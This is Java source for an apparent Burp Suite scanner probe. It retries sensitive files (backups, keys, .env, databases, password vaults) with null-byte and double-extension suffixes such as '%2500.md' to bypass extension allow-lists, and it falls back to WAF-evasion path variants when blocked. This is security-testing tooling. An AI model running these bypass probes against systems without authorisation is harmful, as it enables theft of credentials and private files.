package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.LinkedHashSet;
import java.util.Set;
import java.util.regex.Pattern;

/**
 * Poison-null-byte / extension-bypass file fetcher (generic — no app-specific filenames). File
 * servers that allow only certain download extensions (e.g. .md/.pdf) are commonly bypassed with a
 * URL-encoded null byte: {@code secret.bak%2500.md} passes the extension check but serves the raw
 * file. We take sensitive-looking served files already in the site map and retry them with null-byte
 * / double-extension variants; a successful non-index delivery is the finding (and trips the
 * corresponding "forgotten backup / access log / null byte" challenges server-side).
 */
public final class FileServePathProbe extends Probe {

    // Sensitive/blocked backup-ish extensions worth trying to exfiltrate.
    private static final Pattern SENSITIVE = Pattern.compile(
            "(?i).*\\.(bak|pyc|kdbx|gg|ya?ml|log|zip|tar|gz|tgz|key|pem|crt|conf|ini|old|save|swp|sql|db|env)(\\?.*)?$");
    // Null-byte / double-extension suffixes that bypass an allow-listed extension check.
    private static final String[] BYPASS = { "%2500.md", "%2500.pdf", "%00.md", ".md", ".pdf" };

    public FileServePathProbe(MontoyaApi api, ScanLog scanLog) {
        super(api, scanLog);
    }

    /** Retry sensitive served files (in scope) with null-byte/extension-bypass suffixes. */
    public int probe(String host, String cookieHeader, String bearer) {
        int hits = 0;
        Set<String> tried = new LinkedHashSet<>();
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                String url = rr.request().url();
                if (!host.equalsIgnoreCase(hostOf(url))) continue;
                if (!SENSITIVE.matcher(url).matches()) continue;
                String base = url.split("\\?")[0];
                if (!tried.add(base)) continue;
                for (String suf : BYPASS) {
                    try {
                        HttpRequest req = HttpRequest.httpRequestFromUrl(base + suf).withMethod("GET");
                        if (cookieHeader != null && !cookieHeader.isBlank()) req = req.withHeader("Cookie", cookieHeader);
                        if (bearer != null && !bearer.isBlank()) req = req.withHeader("Authorization", "Bearer " + bearer);
                        HttpRequestResponse r = send(req);
                        if (r == null || r.response() == null) continue;
                        int st = r.response().statusCode();
                        int len = r.response().body().length();
                        if (st == 200 && len > 40 && !looksLikeHtmlIndex(r.response().bodyToString())) {
                            scanLog.found("Sensitive file exposure (extension/null-byte bypass)", base + suf, "served " + len + "b", r);
                            scanLog.incFinding();
                            hits++;
                            break;
                        }
                        if (Evasion.enabled() && (st == 403 || st == 406 || st == 429)) {
                            String path = pathOf(base + suf);
                            for (String variant : Evasion.pathVariants(path)) {
                                try {
                                    String varUrl = base.substring(0, base.length() - pathOf(base).length()) + variant;
                                    HttpRequest rv = HttpRequest.httpRequestFromUrl(varUrl).withMethod("GET");
                                    if (cookieHeader != null && !cookieHeader.isBlank()) rv = rv.withHeader("Cookie", cookieHeader);
                                    if (bearer != null && !bearer.isBlank()) rv = rv.withHeader("Authorization", "Bearer " + bearer);
                                    HttpRequestResponse rv2 = send(rv);
                                    if (rv2 == null || rv2.response() == null) continue;
                                    int sv = rv2.response().statusCode();
                                    int lv = rv2.response().body().length();
                                    if (sv == 200) scanLog.debug("[WAF-evasion] file-serve bypass: " + path + " → " + variant + " HTTP " + sv + " len=" + lv);
                                    if (sv == 200 && lv > 40 && !looksLikeHtmlIndex(rv2.response().bodyToString())) {
                                        scanLog.found("Sensitive file exposure (WAF-evasion path variant)", varUrl, "served " + lv + "b via path variant [slipped " + st + " on " + path + "]", rv2);
                                        scanLog.incFinding();
                                        hits++;
                                        break;
                                    }
                                } catch (Throwable ignore) { }
                            }
                        }
                    } catch (Throwable ignore) { }
                }
            }
        } catch (Throwable t) {
            scanLog.debug("file-serve probe error: " + t);
        }
        return hits;
    }

    private static boolean looksLikeHtmlIndex(String body) {
        String b = body.toLowerCase();
        return b.contains("<!doctype html") || b.contains("<html") || b.contains("index of");
    }
    // hostOf(String) inherited from Probe.
}
